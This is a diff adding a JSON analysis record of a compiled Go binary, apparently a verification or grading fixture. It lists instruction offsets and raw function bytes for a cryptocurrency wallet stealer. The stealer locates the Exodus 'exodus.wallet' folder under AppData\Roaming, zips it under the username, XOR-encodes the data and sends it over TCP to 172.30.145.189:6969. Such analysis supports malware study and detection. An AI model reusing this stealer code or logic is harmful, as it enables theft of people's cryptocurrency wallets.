@@ -1,0 +1,255 @@
+{
+  "pclntab_offset": 1371040,
+  "function_count": 2549,
+  "checks": [
+    {
+      "kind": "CALL_rel32",
+      "fileoffset": 944560,
+      "va": 10122160,
+      "target": 10120544,
+      "caller": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      },
+      "callee": {
+        "index": 2543,
+        "start": 10120544,
+        "end": 10120800
+      },
+      "bytes": "e8abf9ffff"
+    },
+    {
+      "kind": "CALL_rel32",
+      "fileoffset": 944654,
+      "va": 10122254,
+      "target": 10118944,
+      "caller": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      },
+      "callee": {
+        "index": 2538,
+        "start": 10118944,
+        "end": 10119712
+      },
+      "bytes": "e80df3ffff"
+    },
+    {
+      "kind": "CALL_rel32",
+      "fileoffset": 944751,
+      "va": 10122351,
+      "target": 10120800,
+      "caller": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      },
+      "callee": {
+        "index": 2544,
+        "start": 10120800,
+        "end": 10120960
+      },
+      "bytes": "e8ecf9ffff"
+    },
+    {
+      "kind": "CALL_rel32",
+      "fileoffset": 944774,
+      "va": 10122374,
+      "target": 10120960,
+      "caller": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      },
+      "callee": {
+        "index": 2545,
+        "start": 10120960,
+        "end": 10121568
+      },
+      "bytes": "e875faffff"
+    },
+    {
+      "kind": "CALL_rel32",
+      "fileoffset": 943456,
+      "va": 10121056,
+      "target": 9938144,
+      "caller": {
+        "index": 2545,
+        "start": 10120960,
+        "end": 10121568
+      },
+      "callee": {
+        "index": 2132,
+        "start": 9938144,
+        "end": 9938336
+      },
+      "bytes": "e87b35fdff"
+    },
+    {
+      "kind": "LEA_RIP_rel32",
+      "fileoffset": 944186,
+      "va": 10121786,
+      "target": 10345328,
+      "target_fileoffset": 1165168,
+      "literal": "USERPROFILE",
+      "owner": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      }
+    },
+    {
+      "kind": "LEA_RIP_rel32",
+      "fileoffset": 944271,
+      "va": 10121871,
+      "target": 10342824,
+      "target_fileoffset": 1162664,
+      "literal": "Appdata",
+      "owner": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      }
+    },
+    {
+      "kind": "LEA_RIP_rel32",
+      "fileoffset": 944298,
+      "va": 10121898,
+      "target": 10342831,
+      "target_fileoffset": 1162671,
+      "literal": "Roaming",
+      "owner": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      }
+    },
+    {
+      "kind": "LEA_RIP_rel32",
+      "fileoffset": 944325,
+      "va": 10121925,
+      "target": 10342398,
+      "target_fileoffset": 1162238,
+      "literal": "Exodus",
+      "owner": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      }
+    },
+    {
+      "kind": "LEA_RIP_rel32",
+      "fileoffset": 944352,
+      "va": 10121952,
+      "target": 10347348,
+      "target_fileoffset": 1167188,
+      "literal": "exodus.wallet",
+      "owner": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      }
+    },
+    {
+      "kind": "LEA_RIP_rel32",
+      "fileoffset": 944399,
+      "va": 10121999,
+      "target": 10343286,
+      "target_fileoffset": 1163126,
+      "literal": "USERNAME",
+      "owner": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      }
+    },
+    {
+      "kind": "LEA_RIP_rel32",
+      "fileoffset": 944424,
+      "va": 10122024,
+      "target": 10341733,
+      "target_fileoffset": 1161573,
+      "literal": ".zip",
+      "owner": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      }
+    },
+    {
+      "kind": "LEA_RIP_rel32",
+      "fileoffset": 944762,
+      "va": 10122362,
+      "target": 10353104,
+      "target_fileoffset": 1172944,
+      "literal": "172.30.145.189:6969",
+      "owner": {
+        "index": 2548,
+        "start": 10121760,
+        "end": 10122460
+      }
+    },
+    {
+      "kind": "LEA_RIP_rel32",
+      "fileoffset": 943433,
+      "va": 10121033,
+      "target": 10341421,
+      "target_fileoffset": 1161261,
+      "literal": "tcp",
+      "owner": {
+        "index": 2545,
+        "start": 10120960,
+        "end": 10121568
+      }
+    },
+    {
+      "kind": "exact_register_or_loop_or_error_test",
+      "fileoffset": 944756,
+      "va": 10122356,
+      "bytes": "4889c14889df"
+    },
+    {
+      "kind": "exact_register_or_loop_or_error_test",
+      "fileoffset": 944769,
+      "va": 10122369,
+      "bytes": "bb13000000"
+    },
+    {
+      "kind": "exact_register_or_loop_or_error_test",
+      "fileoffset": 943043,
+      "va": 10120643,
+      "bytes": "0fb6341a83f6334088341848ffc34839d97fed"
+    },
+    {
+      "kind": "exact_register_or_loop_or_error_test",
+      "fileoffset": 943461,
+      "va": 10121061,
+      "bytes": "4885c90f8576010000"
+    }
+  ],
+  "functions": [
+    {
+      "index": 2543,
+      "start": 10120544,
+      "end": 10120800,
+      "fileoffset": 942944,
+      "bytes_hex": "493b66100f86cc000000554889e54883ec5848895c24704889442468900f1f00e83b42faff4885ff752948895c2430488944244090488d05a4e900004889d990e8bb3bf6ff488b542440488b4c243031dbeb1e31c031db4889f94889f74883c4585dc30fb6341a83f6334088341848ffc34839d97fed4889442450488b442468488b5c2470e856a0faff488944244848895c243890488b4c2450488b7c24304889fe41b8a4010000e85345faff4885c074104889c14889df31c031db4883c4585dc3488b442448488b5c243831c931ff4883c4585dc3488944240848895c2410e8dbb7f7ff488b442408488b5c2410e90cffffffcccccccccccccccccccccccc"
+    },
+    {
+      "index": 2545,
+      "start": 10120960,
+      "end": 10121568,
+      "fileoffset": 943360,
+      "bytes_hex": "4c8d6424d84d3b66100f8600020000554889e54881eca000000048898424b0000000440f11bc249000000048898c24c00000004889bc24c8000000c644243f00440f117c24584889c2488d05dd5c03004889debb030000004889d14889f76690e87b35fdff4885c90f8576010000488944245048895c2448840048c744247800000000440f11bc2480000000488d152d0200004889542478488984248000000048899c2488000000488d5424784889942498000000c644243f019031c931ff488b8424c0000000488b9c24c8000000e88c3cfaff4885db0f85dc0000004889442440440f117c2468488d0d7101000048894c24684889442470488d4c246848898c2490000000c644243f03488b5c2450488d05096c0100e8a437f2ff488b5c2448488d0dc0370600488b7c244031f64531c04d89c1e866c1f9ff4885db743d440f117c2458c644243f01488b942490000000488b02ffd0c644243f00488b942498000000488b02ffd0488b442458488b5c24604881c4a00000005dc3440f117c2458c644243f01488b942490000000488b02ffd0c644243f00488b942498000000488b02ffd0488b442458488b5c24604881c4a00000005dc3440f117c2458c644243f00488b942498000000488b02ffd0488b5c2460488b4424584881c4a00000005dc3440f117c245831c031db4881c4a00000005dc3e884e0f4ff488b442458488b5c24604881c4a00000005dc3488944240848895c241048894c241848897c2420e8f8b4f7ff488b442408488b5c2410488b4c2418488b7c24200f1f4000e9bbfdffffcccccccccccccccccccccccccccccccccccccccccccccccccccccc"
+    },
+    {
+      "index": 2548,
+      "start": 10121760,
+      "end": 10122460,
+      "fileoffset": 944160,
+      "bytes_hex": "4c8d6424a04d3b66100f86a3020000554889e54881ecd8000000488d052f690300bb0b000000e8352efaff488dbc2488000000488d7fd0660f1f84000000000048896c24f0488d6c24f0e861d9f7ff488b6d0048899c2490000000488984248800000048c78424a000000007000000488d0d125f030048898c249800000048c78424b000000007000000488d0dfe5e030048898c24a800000048c78424c000000006000000488d0d325d030048898c24b800000048c78424d00000000d000000488d0d6d70030048898c24c8000000488d842488000000bb050000004889d990e81ba0faff48895c24284889442458488d0560600300bb080000000f1f440000e85b2dfaff4889d9488d3d365a0300be040000004889c331c0e80274f6ff48895c24304889442460488b442458488b5c2428e8c9f1ffff4885ff751648894c2448488944246848895c24404889c231f6eb254881c4d80000005dc3488b4424704883c010498d7001488b4c2448488b542468488b5c24404839f37e5f48897424384889442470488b08488b58084889c8e8abf9ffff4885c9740c488b4c24684c8b442438ebb5488b5424384989d048c1e204488b4c246848895c1108833d9dd01600007410e856d1f7ff4989034c8b0c114d894b0848890411eb80488b4424604889df4889ce488b5c24304889d1e80df3ffff4885c0750a488b4c246831c090eb344881c4d80000005dc3488944245048894c2470488b01488b59080f1f4000e85b4bfaff488b4c24704883c110488b44245048ffc0488b5424400f1f4400004839c27fc6488b442460488b5c2430e8ecf9ffff4889c14889df488d054f850300bb13000000e875faffff4885c07439440f117c24787404488b4008488944247848899c2480000000488b1db88c1100488d0551330600488d4c2478bf010000004889fee8d7a6fbff4881c4d80000005dc3e849b1f7ffe944fdffff"
+    }
+  ]
+}
